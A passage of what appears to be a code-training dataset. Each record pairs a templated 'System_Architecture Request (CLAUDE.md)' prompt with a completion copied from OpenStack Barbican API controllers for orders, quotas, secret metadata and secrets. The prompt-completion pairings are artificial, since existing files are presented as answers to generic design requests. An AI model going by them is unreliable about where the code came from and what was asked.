res.get_or_create_project(external_project_id)\n\n        body = api.load_body(pecan.request,\n                             validator=self.type_order_validator)\n\n        order_type = body.get('type')\n        order_meta = body.get('meta')\n        request_type = order_meta.get('request_type')\n\n        LOG.debug('Processing order type %(order_type)s,'\n                  ' request type %(request_type)s' %\n                  {'order_type': order_type,\n                   'request_type': request_type})\n\n        self.quota_enforcer.enforce(project)\n\n        new_order = models.Order()\n        new_order.meta = body.get('meta')\n        new_order.type = order_type\n        new_order.project_id = project.id\n\n        request_id = None\n        ctxt = controllers._get_barbican_context(pecan.request)\n        if ctxt:\n            new_order.creator_id = ctxt.user_id\n            request_id = ctxt.request_id\n\n        self.order_repo.create_from(new_order)\n\n        # Grab our id before commit due to obj expiration from sqlalchemy\n        order_id = new_order.id\n\n        # Force commit to avoid async issues with the workers\n        repo.commit()\n\n        self.queue.process_type_order(order_id=order_id,\n                                      project_id=external_project_id,\n                                      request_id=request_id)\n\n        url = hrefs.convert_order_to_href(order_id)\n\n        pecan.response.status = 202\n        pecan.response.headers['Location'] = url\n\n        return {'order_ref': url}\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/orders.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.65, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 209}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2015 Cisco Systems\n#\n#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.common import exception\nfrom barbican.common import quota\nfrom barbican.common import resources as res\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\n\n\nLOG = utils.getLogger(__name__)\n\n\ndef _project_quotas_not_found():\n    \"\"\"Throw exception indicating project quotas not found.\"\"\"\n    pecan.abort(404, u._('Project quotas not found.'))\n\n\nclass QuotasController(controllers.ACLMixin):\n    \"\"\"Handles quota retrieval requests.\"\"\"\n\n    def __init__(self):\n        LOG.debug('=== Creating QuotasController ===')\n        super().__init__()\n        self.quota_driver = quota.QuotaDriver()\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Quotas'))\n    @controllers.enforce_rbac('quotas:get')\n    def on_get(self, external_project_id, **kwargs):\n        LOG.debug('=== QuotasController GET ===')\n        # make sure project exists\n        res.get_or_create_project(external_project_id)\n        resp = self.quota_driver.get_quotas(external_project_id)\n        return resp\n\n\nclass ProjectQuotasController(controllers.ACLMixin):\n    \"\"\"Handles project quota requests.\"\"\"\n\n    def __init__(self, project_id):\n        LOG.debug('=== Creating ProjectQuotasController ===')\n        super().__init__()\n        self.passed_project_id = project_id\n        self.validator = validators.ProjectQuotaValidator()\n        self.quota_driver = quota.QuotaDriver()\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Project Quotas'))\n    @controllers.enforce_rbac('project_quotas:get')\n    def on_get(self, external_project_id, **kwargs):\n        LOG.debug('=== ProjectQuotasController GET ===')\n        resp = self.quota_driver.get_project_quotas(self.passed_project_id)\n        if resp:\n            return resp\n        else:\n            _project_quotas_not_found()\n\n    @index.when(method='PUT', template='json')\n    @controllers.handle_exceptions(u._('Project Quotas'))\n    @controllers.enforce_rbac('project_quotas:put')\n    @controllers.enforce_content_types(['application/json'])\n    def on_put(self, external_project_id, **kwargs):\n        LOG.debug('=== ProjectQuotasController PUT ===')\n        if not pecan.request.body:\n            raise exception.NoDataToProcess()\n        api.load_body(pecan.request,\n                      validator=self.validator)\n        self.quota_driver.set_project_quotas(self.passed_project_id,\n                                             kwargs['project_quotas'])\n        LOG.info('Put Project Quotas')\n        pecan.response.status = 204\n\n    @index.when(method='DELETE', template='json')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Project Quotas'))\n    @controllers.enforce_rbac('project_quotas:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        LOG.debug('=== ProjectQuotasController DELETE ===')\n        try:\n            self.quota_driver.delete_project_quotas(self.passed_project_id)\n        except exception.NotFound:\n            LOG.info('Delete Project Quotas - Project not found')\n            _project_quotas_not_found()\n        else:\n            LOG.info('Delete Project Quotas')\n            pecan.response.status = 204\n\n\nclass ProjectsQuotasController(controllers.ACLMixin):\n    \"\"\"Handles projects quota retrieval requests.\"\"\"\n\n    def __init__(self):\n        LOG.debug('=== Creating ProjectsQuotaController ===')\n        super().__init__()\n        self.quota_driver = quota.QuotaDriver()\n\n    @pecan.expose()\n    def _lookup(self, project_id, *remainder):\n        return ProjectQuotasController(project_id), remainder\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Project Quotas'))\n    @controllers.enforce_rbac('project_quotas:get')\n    def on_get(self, external_project_id, **kwargs):\n        resp = self.quota_driver.get_project_quotas_list(\n            offset_arg=kwargs.get('offset', 0),\n            limit_arg=kwargs.get('limit', None)\n        )\n        return resp\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/quotas.py", "language": "python", "complexity": "medium", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 139}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\nimport collections\nimport pecan\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.common import hrefs\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import repositories as repo\n\nLOG = utils.getLogger(__name__)\n\n\ndef _secret_metadata_not_found():\n    \"\"\"Throw exception indicating secret metadata not found.\"\"\"\n    pecan.abort(404, u._('Secret metadata not found.'))\n\n\nclass SecretMetadataController(controllers.ACLMixin):\n    \"\"\"Handles SecretMetadata requests by a given secret id.\"\"\"\n\n    def __init__(self, secret):\n        LOG.debug('=== Creating SecretMetadataController ===')\n        super().__init__()\n        self.secret = secret\n        self.secret_project_id = self.secret.project.external_id\n        self.secret_repo = repo.get_secret_repository()\n        self.user_meta_repo = repo.get_secret_user_meta_repository()\n        self.metadata_validator = validators.NewSecretMetadataValidator()\n        self.metadatum_validator = validators.NewSecretMetadatumValidator()\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Secret metadata retrieval'))\n    @controllers.enforce_rbac('secret_meta:get')\n    def on_get(self, external_project_id, **kwargs):\n        \"\"\"Handles retrieval of existing secret metadata requests.\"\"\"\n\n        LOG.debug('Start secret metadata on_get '\n                  'for secret-ID %s:', self.secret.id)\n\n        resp = self.user_meta_repo.get_metadata_for_secret(self.secret.id)\n        pecan.response.status = 200\n\n        return {\"metadata\": resp}\n\n    @index.when(method='PUT', template='json')\n    @controllers.handle_exceptions(u._('Secret metadata creation'))\n    @controllers.enforce_rbac('secret_meta:put')\n    @controllers.enforce_content_types(['application/json'])\n    def on_put(self, external_project_id, **kwargs):\n        \"\"\"Handles creation/update of secret metadata.\"\"\"\n        data = api.load_body(pecan.request, validator=self.metadata_validator)\n        LOG.debug('Start secret metadata on_put...%s', data)\n\n        self.user_meta_repo.create_replace_user_metadata(self.secret.id,\n                                                         data)\n\n        url = hrefs.convert_user_meta_to_href(self.secret.id)\n        LOG.debug('URI to secret metadata is %s', url)\n\n        pecan.response.status = 201\n        return {'metadata_ref': url}\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Secret metadatum creation'))\n    @controllers.enforce_rbac('secret_meta:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n        \"\"\"Handles creation of secret metadatum.\"\"\"\n\n        data = api.load_body(pecan.request, validator=self.metadatum_validator)\n\n        key = data.get('key')\n        value = data.get('value')\n\n        metadata = self.user_meta_repo.get_metadata_for_secret(self.secret.id)\n        if key in metadata:\n            pecan.abort(409, u._('Conflict. Key in request is already in the '\n                                 'secret metadata'))\n\n        LOG.debug('Start secret metadatum on_post...%s', metadata)\n        self.user_meta_repo.create_replace_user_metadatum(self.secret.id,\n                                                          key, value)\n\n        url = hrefs.convert_user_meta_to_href(self.secret.id)\n        LOG.debug('URI to secret metadata is %s', url)\n\n        pecan.response.status = 201\n        pecan.response.headers['Location'] = url + '/' + key\n        return {'key': key, 'value': value}\n\n\nclass SecretMetadatumController(controllers.ACLMixin):\n\n    def __init__(self, secret):\n        LOG.debug('=== Creating SecretMetadatumController ===')\n        super().__init__()\n        self.user_meta_repo = repo.get_secret_user_meta_repository()\n        self.secret = secret\n        self.metadatum_validator = validators.NewSecretMetadatumValidator()\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Secret metadatum retrieval'))\n    @controllers.enforce_rbac('secret_meta:get')\n    def on_get(self, external_project_id, remainder, **kwargs):\n        \"\"\"Handles retrieval of existing secret metadatum.\"\"\"\n\n        LOG.debug('Start secret metadatum on_get '\n                  'for secret-ID %s:', self.secret.id)\n\n        metadata = self.user_meta_repo.get_metadata_for_secret(self.secret.id)\n        if remainder in metadata:\n            pecan.response.status = 200\n            pair = {'key': remainder, 'value': metadata[remainder]}\n            return collections.OrderedDict(sorted(pair.items()))\n        else:\n            _secret_metadata_not_found()\n\n    @index.when(method='PUT', template='json')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Secret metadatum update'))\n    @controllers.enforce_rbac('secret_meta:put')\n    @controllers.enforce_content_types(['application/json'])\n    def on_put(self, external_project_id, remainder, **kwargs):\n        \"\"\"Handles update of existing secret metadatum.\"\"\"\n        metadata = self.user_meta_repo.get_metadata_for_secret(self.secret.id)\n        data = api.load_body(pecan.request, validator=self.metadatum_validator)\n\n        key = data.get('key')\n        value = data.get('value')\n\n        if remainder not in metadata:\n            _secret_metadata_not_found()\n        elif remainder != key:\n            msg = 'Key in request data does not match key in the '\n            'request url.'\n            pecan.abort(409, msg)\n        else:\n            LOG.debug('Start secret metadatum on_put...%s', metadata)\n\n            self.user_meta_repo.create_replace_user_metadatum(self.secret.id,\n                                                              key, value)\n\n            pecan.response.status = 200\n            pair = {'key': key, 'value': value}\n            return collections.OrderedDict(sorted(pair.items()))\n\n    @index.when(method='DELETE', template='json')\n    @controllers.handle_exceptions(u._('Secret metadatum removal'))\n    @controllers.enforce_rbac('secret_meta:delete')\n    def on_delete(self, external_project_id, remainder, **kwargs):\n        \"\"\"Handles removal of existing secret metadatum.\"\"\"\n\n        self.user_meta_repo.delete_metadatum(self.secret.id,\n                                             remainder)\n        msg = 'Deleted secret metadatum: %s for secret %s' % (remainder,\n                                                              self.secret.id)\n        pecan.response.status = 204\n        LOG.info(msg)\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/secretmeta.py", "language": "python", "complexity": "medium", "star_count": 241, "quality_score": 0.65, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 181}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nfrom oslo_utils import timeutils\nimport pecan\nfrom urllib import parse\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.api.controllers import acls\nfrom barbican.api.controllers import consumers\nfrom barbican.api.controllers import secretmeta\nfrom barbican.api.controllers import versions\nfrom barbican.common import accept\nfrom barbican.common import exception\nfrom barbican.common import hrefs\nfrom barbican.common import quota\nfrom barbican.common import resources as res\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import models\nfrom barbican.model import repositories as repo\nfrom barbican.plugin import resources as plugin\nfrom barbican.plugin import util as putil\n\n\nLOG = utils.getLogger(__name__)\n\n\ndef _secret_not_found():\n    \"\"\"Throw exception indicating secret not found.\"\"\"\n    pecan.abort(404, u._('Secret not found.'))\n\n\ndef _invalid_secret_id():\n    \"\"\"Throw exception indicating secret id is invalid.\"\"\"\n    pecan.abort(404, u._('Not Found. Provided secret id is invalid.'))\n\n\ndef _secret_payload_not_found():\n    \"\"\"Throw exception indicating secret's payload is not found.\"\"\"\n    pecan.abort(404, u._('Not Found. Sorry but your secret has no payload.'))\n\n\ndef _secret_already_has_data():\n    \"\"\"Throw exception that the secret already has data.\"\"\"\n    pecan.abort(409, u._(\"Secret already has data, cannot modify it.\"))\n\n\ndef _bad_query_string_parameters():\n    pecan.abort(400, u._(\"URI provided invalid query string parameters.\"))\n\n\ndef _request_has_twsk_but_no_transport_key_id():\n    \"\"\"Throw exception for bad wrapping parameters.\n\n    Throw exception if transport key wrapped session key has been provided,\n    but the transport key id has not.\n    \"\"\"\n    pecan.abort(400, u._('Transport key wrapped session key has been '\n                         'provided to wrap secrets for retrieval, but the '\n                         'transport key id has not been provided.'))\n\n\nclass SecretController(controllers.ACLMixin):\n    \"\"\"Handles Secret retrieval and deletion requests.\"\"\"\n\n    def __init__(self, secret):\n        LOG.debug('=== Creating SecretController ===')\n        super().__init__()\n        self.secret = secret\n        self.consumers = consumers.SecretConsumersController(secret)\n        self.consumer_repo = repo.get_secret_consumer_repository()\n        self.transport_key_repo = repo.get_transport_key_repository()\n\n    @pecan.expose()\n    def _lookup(self, sub_resource, *remainder):\n        if sub_resource == 'acl':\n            return acls.SecretACLsController(self.secret), remainder\n        elif sub_resource == 'metadata':\n            if len(remainder) == 0 or remainder == ('',):\n                return secretmeta.SecretMetadataController(self.secret), \\\n                    remainder\n            else:\n                request_method = pecan.request.method\n                allowed_methods = ['GET', 'PUT', 'DELETE']\n\n                if request_method in allowed_methods:\n                    return secretmeta.SecretMetadatumController(self.secret), \\\n                        remainder\n                else:\n                    # methods cannot be handled at controller level\n                    pecan.abort(405)\n        else:\n            # only 'acl' and 'metadata' as sub-resource is supported\n            pecan.abort(404)\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Secret retrieval'))\n    @controllers.enforce_rbac('secret:get')\n    def on_get(self, external_project_id, **kwargs):\n        if controllers.is_json_request_accept(pecan.request):\n            resp = self._on_get_secret_metadata(self.secret, **kwargs)\n\n            LOG.info('Retrieved secret metadata for project: %s',\n                     external_project_id)\n            if versions.is_supported(pecan.request, max_version='1.0'):\n                # NOTE(xek): consumers are being introduced in 1.1\n                del resp['consumers']\n            return resp\n        else:\n            LOG.warning('Decrypted secret %s requested using deprecated '\n                        'API call.', self.secret.id)\n            return self._on_get_secret_payload(self.secret,\n                                               external_project_id,\n                                               **kwargs)\n\n    def _on_get_secret_metadata(self, secret, **kwargs):\n        \"\"\"GET Metadata-only for a secret.\"\"\"\n        pecan.override_template('json', 'application/json')\n\n        secret_fields = putil.mime_types.augment_fields_with_content_types(\n            secret)\n\n        transport_key_id = self._get_transport_key_id_if_needed(\n            kwargs.get('transport_key_needed'), secret)\n\n        if transport_key_id:\n            secret_fields['transport_key_id'] = transport_key_id\n\n        return hrefs.convert_to_hrefs(secret_fields)\n\n    def _get_transport_key_id_if_needed(self, transport_key_needed, secret):\n        if transport_key_needed and transport_key_needed.lower() == 'true':\n            return plugin.get_transport_key_id_for_retrieval(secret)\n        return None\n\n    def _on_get_secret_payload(self, secret, external_project_id, **kwargs):\n        \"\"\"GET actual payload containing the secret.\"\"\"\n\n        # With ACL support, the user token project does not have to be same as\n        # project associated with secret. The lookup project_id needs to be\n        # derived from the secret's data considering authorization is already\n        # done.\n        external_project_id = secret.project.external_id\n        project = res.get_or_create_project(external_project_id)\n\n        # default to application/octet-stream if there is no Accept header\n        if (type(pecan.request.accept) is accept.NoHeaderType or\n                not pecan.request.accept.header_value):\n            accept_header = 'application/octet-stream'\n        else:\n            accept_header = pecan.request.accept.header_value\n        pecan.override_template('', accept_header)\n\n        # check if payload exists before proceeding\n        if not secret.encrypted_data and not secret.secret_store_metadata:\n            _secret_payload_not_found()\n\n        twsk = kwargs.get('trans_wrapped_session_key', None)\n        transport_key = None\n\n        if twsk:\n            transport_key = self._get_transport_key(\n                kwargs.get('transport_key_id', None))\n\n        return plugin.get_secret(accept_header,\n                                 secret,\n                                 project,\n                                 twsk,\n                                 transport_key)\n\n    def _get_transport_key(self, transport_key_id):\n        if transport_key_id is None:\n            _request_has_twsk_but_no_transport_key_id()\n\n        transport_key_model = self.transport_key_repo.get(\n            entity_id=transport_key_id,\n            suppress_exception=True)\n\n        return transport_key_model.transport_key\n\n    @pecan.expose()\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Secret payload retrieval'))\n    @controllers.enforce_rbac('secret:decrypt')\n    def payload(self, external_project_id, **kwargs):\n        if pecan.request.method != 'GET':\n            pecan.abort(405)\n\n        resp = self._on_get_secret_payload(self.secret,\n                                           external_project_id,\n                                           **kwargs)\n\n        LOG.info('Retrieved secret payload for project: %s',\n                 external_project_id)\n        return resp\n\n    @index.when(method='PUT')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Secret update'))\n    @controllers.enforce_rbac('secret:put')\n    @controllers.enforce_content_types(['application/octet-stream',\n                                       'text/plain'])\n    def on_put(self, external_project_id, **kwargs):\n        if (not pecan.request.content_type or\n                pecan.request.content_type == 'application/json'):\n            pecan.abort(\n                415,\n                u._(\"Content-Type of '{content_type}' is not supported for \"\n                    \"PUT.\").format(content_type=pecan.request.content_type)\n            )\n\n        transport_key_id = kwargs.get('transport_key_id')\n\n        payload = pecan.request.body\n        if not payload:\n            raise exception.NoDataToProcess()\n        if validators.secret_too_big(payload):\n            raise exception.LimitExceeded()\n\n        if self.secret.encrypted_data or self.secret.secret_store_metadata:\n            _secret_already_has_data()\n\n        project_model = res.get_or_create_project(external_project_id)\n        content_type = pecan.request.content_type\n        content_encoding = pecan.request.headers.get('Content-Encoding')\n\n        plugin.store_secret(\n            unencrypted_raw=payload,\n            content_type_raw=content_type,\n            content_encoding=content_encoding,\n            secret_model=self.secret,\n            project_model=project_model,\n            transport_key_id=transport_key_id)\n        LOG.info('Updated secret for project: %s', external_project_id)\n\n    @index.when(method='DELETE')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Secret deletion'))\n    @controllers.enforce_rbac('secret:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        secret_consumers = self.consumer_repo.get_by_secret_id(\n            self.secret.id,\n            suppress_exception=True\n        )\n\n        # With ACL support, the user token project does not have to be same as\n        # project associated with secret. The lookup project_id needs to be\n        # derived from the secret's data considering authorization is already\n        # done.\n        external_project_id = self.secret.project.external_id\n        plugin.delete_secret(self.secret, external_project_id)\n        LOG.info('Deleted secret for project: %s', external_project_id)\n\n        for consumer in secret_consumers[0]:\n            try:\n                self.consumer_repo.delete_entity_by_id(\n                    consumer.id, external_project_id)\n            except exception.NotFound:  # nosec\n                pass\n\n\nclass SecretsController(controllers.ACLMixin):\n    \"\"\"Handles Secret creation requests.\"\"\"\n\n    def __init__(self):\n        LOG.debug('Creating SecretsController')\n        super().__init__()\n        self.validator = validators.NewSecretValidator()\n        self.secret_repo = repo.get_secret_repository()\n        self.quota_enforcer = quota.QuotaEnforcer('secrets', self.secret_repo)\n\n    def _is_valid_date_filter(self, date_filter):\n        filters = date_filter.split(',')\n        sorted_filters = dict()\n        try:\n            for filter in filters:\n                if filter.startswith('gt:'):\n                    if sorted_filters.get('gt') or sorted_filters.get('gte'):\n                        return False\n                    sorted_filters['gt'] = timeutils.parse_isotime(filter[3:])\n                elif filter.startswith('gte:'):\n                    if sorted_filters.get('gt') or sorted_filters.get(\n                            'gte') or sorted_filters.get('eq'):\n                        return False\n                    sorted_filters['gte'] = timeutils.parse_isotime(filter[4:])\n                elif filter.startswith('lt:'):\n                    if sorted_filters.get('lt') or sorted_filters.get('lte'):\n                        return False\n                    sorted_filters['lt'] = timeutils.parse_isotime(filter[3:])\n                elif filter.startswith('lte:'):\n                    if sorted_filters.get('lt') or sorted_filters.get(\n                            'lte') or sorted_filters.get('eq'):\n                        return False\n                    sorted_filters['lte'] = timeutils.parse_isotime(filter[4:])\n                elif sorted_filters.get('eq') or sorted_filters.get(\n                        'gte') or sorted_filters.get('lte'):\n                    return False\n                else:\n                    sorted_filters['eq'] = timeutils.parse_isotime(filter)\n        except ValueError:\n            return False\n        return True\n\n    def _is_valid_sorting(self, sorting):\n        allowed_keys = ['algorithm', 'bit_length', 'created',\n                        'expiration', 'mode', 'name', 'secret_type', 'status',\n                        'updated']\n        allowed_directions = ['asc', 'desc']\n        sorted_keys = dict()\n        for sort in sorting.split(','):\n            if ':' in sort:\n                try:\n                    key, direction = sort.split(':')\n                except ValueError:\n                    return False\n            else:\n                key, direction = sort, 'asc'\n            if key not in allowed_keys or direction not in allowed_directions:\n                return False\n            if sorted_keys.get(key):\n                return False\n            else:\n                sorted_keys[key] = direction\n        return True\n\n    @pecan.expose()\n    def _lookup(self, secret_id, *remainder):\n        # NOTE(jaosorior): It's worth noting that even though this section\n        # actually does a lookup in the database regardless of the RBAC policy\n        # check, the execution only gets here if authentication of the user was\n        # previously successful.\n\n        if not utils.validate_id_is_uuid(secret_id):\n            _invalid_secret_id()()\n        secret = self.secret_repo.get_secret_by_id(\n            entity_id=secret_id, suppress_exception=True)\n        if not secret:\n            _secret_not_found()\n\n        return SecretController(secret), remainder\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Secret(s) retrieval'))\n    @controllers.enforce_rbac('secrets:get')\n    def on_get(self, external_project_id, **kw):\n        no_consumers = versions.is_supported(pecan.request, max_version='1.0')\n        # NOTE(xek): consumers are being introduced in 1.1\n\n        def secret_fields(field):\n            resp = putil.mime_types.augment_fields_with_content_types(field)\n            if no_consumers:\n                del resp['consumers']\n            return resp\n\n        LOG.debug('Start secrets on_get '\n                  'for project-ID %s:', external_project_id)\n\n        name = kw.get('name', '')\n        if name:\n            name = parse.unquote_plus(name)\n\n        bits = kw.get('bits', 0)\n        try:\n            bits = int(bits)\n        except ValueError:\n            # as per Github issue 171, if bits is invalid then\n            # the default should be used.\n            bits = 0\n\n        for date_filter in 'created', 'updated', 'expiration':\n            if kw.get(date_filter) and not self._is_valid_date_filter(\n                    kw.get(date_filter)):\n                _bad_query_string_parameters()\n        if kw.get('sort') and not self._is_valid_sorting(kw.get('sort')):\n            _bad_query_string_parameters()\n\n        ctxt = controllers._get_barbican_context(pecan.request)\n        user_id = None\n        if ctxt:\n            user_id = ctxt.user_id\n\n        result = self.secret_repo.get_secret_list(\n            external_project_id,\n            offset_arg=kw.get('offset', 0),\n            limit_arg=kw.get('limit'),\n            name=name,\n            alg=kw.get('alg'),\n            mode=kw.get('mode'),\n            bits=bits,\n            secret_type=kw.get('secret_type'),\n            suppress_exception=True,\n            acl_only=kw.get('acl_only'),\n            user_id=user_id,\n            created=kw.get('created'),\n            updated=kw.get('updated'),\n            expiration=kw.get('expiration'),\n            sort=kw.get('sort')\n        )\n\n        secrets, offset, limit, total = result\n\n        if not secrets:\n            secrets_resp_overall = {'secrets': [],\n                                    'total': total}\n        else:\n            secrets_resp = [\n                hrefs.convert_to_hrefs(secret_fields(s))\n                for s in secrets\n            ]\n            secrets_resp_overall = hrefs.add_nav_hrefs(\n                'secrets', offset, limit, total,\n                {'secrets': secrets_resp}\n            )\n            secrets_resp_overall.update({'total': total})\n\n        LOG.info('Retrieved secret list for project: %s',\n                 external_project_id)\n        return secrets_resp_overall\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Secret creation'))\n    @controllers.enforce_rbac('secrets:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n        LOG.debug('Start on_post for project-ID %s:...',\n                  external_project_id)\n\n        data = api.load_body(pecan.request, validator=self.validator)\n        project = res.get_or_create_project(external_project_id)\n\n        self.quota_enforcer.enforce(project)\n\n        transport_key_needed = data.get('transport_key_needed',\n                                        'false').lower() == 'true'\n        ctxt = controllers._get_barbican_context(pecan.request)\n        if ctxt:  # in authenticated pipleline case, always use auth token user\n            data['creator_id'] = ctxt.user_id\n\n        secret_model = models.Secret(data)\n\n        new_secret, transport_key_model = plugin.store_secret(\n            unencrypted_raw=data.get('payload'),\n            content_type_raw=data.get('payload_content_type',\n                                      'application/octet-stream'),\n            content_encoding=data.get('payload_content_encoding'),\n            secret_model=secret_model,\n            project_model=project,\n            transport_key_needed=transport_key_needed,\n            transport_key_id=data.get('transport_key_id'))\n\n        url = hrefs.convert_secret_to_href(new_secret.id)\n        LOG.debug('URI to secret is %s', url)\n\n        pecan.response.status = 201\n        pecan.response.headers['Location'] = url\n\n        LOG.info('Created a secret for project: %s',\n                 external_project_id)\n        if transport_key_model is not None:\n            tkey_url = hrefs.convert_transport_key_to_href(\n                transport_key_model.id)\n            return {'secret_ref': url, 'transport_key_ref': tkey_url}\n        else:\n            return {'secret_ref': url}\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/secrets.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 486}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# (c) Copyright 2015-2016 Hewlett Packard Enterprise Development LP\n#\n#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\n\nfrom barbican.api import controllers\nfrom barbican.common import hrefs\nfrom barbican.common import resources as res\nfrom barbican.common import utils\nfrom barbican import i18n as u\nfrom barbican.model import repositories as repo\nfrom barbican.plugin.util import multiple_backends\n\nLOG = utils.getLogger(__name__)\n\n\ndef _secret_store_not_found():\n    \"\"\"Throw exception indicating secret store not found.\"\"\"\n    pecan.abort(404, u._('Not Found. Secret store not found.'))\n\n\ndef 